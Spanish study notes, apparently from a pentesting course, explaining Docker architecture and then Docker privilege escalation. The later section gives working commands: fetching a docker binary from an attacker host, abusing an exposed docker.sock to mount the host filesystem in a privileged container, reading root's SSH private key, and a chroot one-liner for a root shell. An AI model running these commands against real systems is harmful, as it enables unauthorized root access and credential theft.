
Proporciona un entorno de ejecucion portatil y consistente para aplicaciones de sw. Usa contenedores como entornos aislados en el espacio de usuario y se ejecutan a nivel SO compartiendo sistemas, archivos y recursos

## Arquitectura Docker

Es un modelo cliente-servidor donde hay 2 componentes principales:

- Daemon Docker
- Cliente Docker

#### Daemon Docker

O servidor Dicker es el que gestiona y orquesta los contenedores. Funciones:

- Ejecutar contendores Docker
- Interactuar con contenedores Docker
- Gestionar contenedores Docker en el sistema 

#### Gestion de contenedores Docker

Coordina la creacion, ejecucion y monitoreo de los contenedores manteniendo aislado el anfitrion garantizando que los contenedores operen de forma independiente

#### Redes y almacenamiento

Facilita redes de contenedores creando redes virtuales y gestionando las interfaces de red. Permite que los contenedores se comuniquen entre si y con el mundo exterior a traves de puertos, direcciones IP y resolucion DNS

#### Clientes Docker

Para interactuar con un Docker emitimos comandos a traves de cliente Docker que se comunica con el daemon a traves de API Restful o un socker Unix

Podremos iniciar, detener, gestionar, eliminar, buscar.... Mientras que el daemon es el encargado de realizar las acciones

`Docker Compose` es una herramienta que simplifica la orquestacion de multiples contenedores en una misma aplicacion

#### Docker Desktop

GUI que simplifica la gestion de los contenedores y sus componentes permitiendonos monitorear el estado de los contenedores

## Imagenes y contenedores Docker

Imagen: plantilla para crear contenedores que encapsula todo lo necesario para ejecutar una aplicacion incluyendo el codigo de la aplicacion, dependencias...

Podemos crear imagenes usando un archivo llamado `DockerFile` que define los pasos e instrucciones para construir una imagen

Un contenedor es una instancia de estas imagenes

Mientras que las imágenes son inmutables y de solo lectura, los contenedores son mutables y pueden ser modificados


## Escalada de privs en Docker

Puede que entremos en un entorno donde haya usuarios que gestionan contenedores Docker

#### Directorios compartidos de Docker

Estos directorios compartidos pueden cerrar la brecha entre el sistema anfitrion y el sistema de archivos del contenedor. Con estos se puede acceder a archivos del sistema anfitrion desde el contenedor

Esto depende de la configuracion del entorno y de los objetivos que los administradores quieran alcanzar

Es importante tener en cuenta que los directorios compartidos pueden montarse como de solo lectura o de lectura-escritura. Cuando se montan como de solo lectura, las modificaciones realizadas dentro del contenedor no afectarán al sistema anfitrión, lo que es útil cuando se prefiere el acceso de solo lectura para evitar modificaciones accidentales

#### Sockets de Docker

Archivo especial que nos permite comunicarnos con el daemon actuando como puente. Cuando emitimos un comando a traves del CLI Docker, el cliente Docker envia el comando al socket y el daemon lo procesa

El acceso al socket suele estar restringido a usuarios y grupos especificos. Al exponer este socket a la red podriamos gestionarlo de forma remota, emitir comandos y controlar contenedores y recursos

```
ls -al
```
![[Pasted image 20260920115542.png]]

Podemos instalar el binario [Docker](https://master.dockerproject.com/linux/x86_64/docker) para interactuar con el socket desde nuestra maquina:

```
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
ls -l
/tmp/docker -H unix:///app/docker.sock ps
```
![[Pasted image 20260920115711.png]]

Podemos crear nuestro propio contenedor que mapee el directorio / en el directorio /hostsystem y tener acceso completo al sistema anfitrion

```
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

/tmp/docker -H unix:///app/docker.sock ps
```
![[Pasted image 20260920115810.png]]

Ahora podemos iniciar sesion en el nuevo contenedor Docker:

```
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
cat /hostsystem/root/.ssh/id_rsa
```
![[Pasted image 20260920115845.png]]

#### Grupo Docker

Para obtener privs root a traves de Docker, debemos estar en el grupo docker

```
id
```
![[Pasted image 20260920115932.png]]

Alternativamente, Docker puede tener el SUID establecido, o podemos estar en el archivo Sudoers, lo que nos permite ejecutar `docker` como root

Vemos qué imágenes existen y a cuáles podemos acceder:

```
docker image ls
```
![[Pasted image 20260920120239.png]]

#### Socket de Docker

Un caso que también puede ocurrir es cuando el socket de Docker tiene permisos de escritura. Por lo general, este socket se encuentra en `/var/run/docker.sock`. Sin embargo, la ubicación puede ser comprensiblemente diferente

	No hace falta pertenecer al grupo docker

```
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

ls -l
```
